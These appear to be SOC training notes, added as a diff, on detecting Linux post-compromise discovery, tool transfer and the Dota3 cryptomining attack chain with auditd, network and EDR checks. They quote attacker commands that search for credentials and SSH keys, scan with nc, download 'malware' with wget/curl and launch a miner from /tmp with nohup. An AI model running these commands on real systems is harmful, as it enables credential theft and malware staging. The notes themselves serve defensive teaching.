@@ -14923,3 +14923,342 @@ Human-led attacks:
 Supply chain:
   Compromised software/dependency
 ```
+
+# Linux Threat Detection 2
+
+## Discovery
+
+After gaining access to a Linux system, attackers usually perform **Discovery** to understand the host, users, network, and available resources.
+
+### Common Discovery Commands
+
+| Goal | Commands |
+|---|---|
+| OS & Filesystem | `pwd`, `ls`, `uname -a`, `hostname`, `env` |
+| Users & Groups | `id`, `whoami`, `w`, `last`, `cat /etc/passwd` |
+| Processes & Network | `ps aux`, `ip a`, `ip r`, `ss -tnlp` |
+| Virtualization/Sandbox | `systemd-detect-virt`, `lsmod`, `uptime` |
+
+### Important Command
+
+```bash
+whoami
+```
+
+`whoami` is commonly executed immediately after compromise to identify the current user.
+
+---
+
+## Specialized Discovery
+
+Attackers may perform more targeted discovery depending on their goal.
+
+### Find Credentials and Secrets
+
+```bash
+history | grep pass
+find / -name .env
+find /home -name id_rsa
+```
+
+### Check System Resources
+
+Useful for identifying systems suitable for cryptomining:
+
+```bash
+cat /proc/cpuinfo
+lscpu
+free -m
+```
+
+### Scan the Internal Network
+
+```bash
+ping <IP>
+nc -w 1 <IP> 22
+```
+
+---
+
+## Detecting Discovery
+
+Discovery commands alone are not always malicious because administrators also use them.
+
+### Key Principle
+
+**Always investigate the context and process origin.**
+
+Example:
+
+```text
+Web Server
+└── bash
+    └── whoami
+```
+
+A web server spawning `whoami` is much more suspicious than an administrator running it manually.
+
+### Auditd Investigation
+
+Find a command:
+
+```bash
+ausearch -i -x whoami
+```
+
+Find its parent process:
+
+```bash
+ausearch -i --pid <PID>
+```
+
+Continue tracing the process tree to determine **which user, script, or application started the command**.
+
+---
+
+# Attacker Motivations
+
+## Hack and Forget Attacks
+
+These attacks are automated and focus on quick profit.
+
+Common goals:
+
+1. **Cryptomining** — Use the victim's CPU/GPU to mine cryptocurrency.
+2. **Botnet** — Add the system to a botnet for activities such as DDoS.
+3. **Proxy** — Use the compromised host to route traffic or host malicious content.
+
+---
+
+# Ingress Tool Transfer
+
+Attackers often need to download additional tools or malware after gaining access.
+
+### Common Methods
+
+| Method | Example |
+|---|---|
+| `wget` | `wget https://example.com/malware -O /tmp/malware` |
+| `curl` | `curl -o /tmp/malware https://example.com/malware` |
+| `scp` / `sftp` | Transfer files through SSH |
+
+### Important Detection Difference
+
+If the **attacker connects to the victim** and uses `scp`, the victim may only show the **SSH login**.
+
+If the **victim connects to the attacker** using `scp`, the victim's audit logs can show the `scp` command.
+
+### Detection
+
+Look for:
+
+- Suspicious external IP/domain
+- Downloads from suspicious websites
+- Files created in `/tmp` or `/var/tmp`
+- Suspicious filenames such as `exploit`, `shell.php`, or random names
+- EDR/antivirus alerts
+
+Useful command:
+
+```bash
+ausearch -i -x wget
+ausearch -i -x curl
+ausearch -i -x scp
+```
+
+---
+
+# Dota3 Malware
+
+Dota3 is an example of an automated Linux attack chain focused mainly on **cryptomining and propagation**.
+
+## Dota3 Attack Chain
+
+```text
+Internet scanning
+      ↓
+SSH brute force
+      ↓
+Successful SSH login
+      ↓
+Discovery
+      ↓
+Persistence
+      ↓
+Malware transfer
+      ↓
+Internal SSH scanning
+      ↓
+Cryptominer
+```
+
+### Initial Access
+
+Attackers:
+
+- Scan the Internet for exposed SSH
+- Brute-force weak passwords
+- Log in through SSH
+
+### Discovery
+
+Commands such as:
+
+```bash
+cat /proc/cpuinfo
+free -m
+lscpu
+uname -m
+w
+crontab -l
+```
+
+Checking CPU and RAM is a strong indicator of **cryptomining-related activity**.
+
+---
+
+# Dota3 Persistence
+
+Dota3 changes the compromised user's password and replaces SSH keys.
+
+Important indicators:
+
+```text
+passwd
+~/.ssh/authorized_keys
+```
+
+Attackers may also remove the legitimate `.ssh` directory and create their own `authorized_keys`.
+
+---
+
+# Dota3: Miner Setup
+
+After gaining SSH access, attackers transfer the malware and stage it under `/tmp`.
+
+Example:
+
+```text
+/tmp/.X26-unix/
+└── .rsync/
+    └── c/
+```
+
+### Important Indicators
+
+- Hidden directories under `/tmp`
+- Malware archives such as `dota3.tar.gz`
+- Suspicious use of `nohup`
+- Unknown binaries running from `/tmp`
+
+### Malware Components
+
+```text
+tsm
+└── Scans internal networks for SSH
+
+initall
+└── XMRig-based cryptominer
+```
+
+The attacker uses `nohup` so the malware continues running after the SSH session ends.
+
+Example:
+
+```bash
+nohup /tmp/.X26-unix/.rsync/initall &
+```
+
+---
+
+# Dota3 Detection
+
+### Auditd
+
+Look for:
+
+- Creation of hidden files/directories in `/tmp`
+- Creation of malware archives
+- Execution of `nohup`
+- Suspicious binaries executed from `/tmp`
+
+### Network
+
+Look for:
+
+- Large-scale SSH scanning
+- Connections to many hosts on port `22`
+- Scanning of internal networks such as:
+  - `192.168.x.x`
+  - `172.16.x.x`
+
+### EDR
+
+Look for:
+
+- XMRig or other cryptominer detection
+- High CPU usage from unknown processes
+- Unknown binaries running from `/tmp`
+
+---
+
+# Quick SOC Cheat Sheet
+
+```text
+Discovery:
+  whoami
+  id
+  uname -a
+  hostname
+  ps aux
+  ip a
+  ss -tnlp
+
+Credential discovery:
+  history | grep pass
+  find / -name .env
+  find /home -name id_rsa
+
+System resource discovery:
+  cat /proc/cpuinfo
+  lscpu
+  free -m
+
+Network discovery:
+  ping <IP>
+  nc <IP> 22
+
+Auditd:
+  ausearch -i -x <command>
+  ausearch -i --pid <PID>
+
+Tool transfer:
+  wget
+  curl
+  scp
+  sftp
+
+Suspicious locations:
+  /tmp
+  /var/tmp
+
+Dota3 indicators:
+  SSH brute force
+  Discovery spike
+  CPU/RAM discovery
+  SSH key modification
+  Hidden /tmp directories
+  dota3.tar.gz
+  nohup
+  Internal SSH scanning
+  XMRig cryptominer
+
+Main investigation method:
+  Suspicious command
+       ↓
+  Parent process
+       ↓
+  Original user/application
+       ↓
+  Determine whether activity is legitimate or malicious
+```
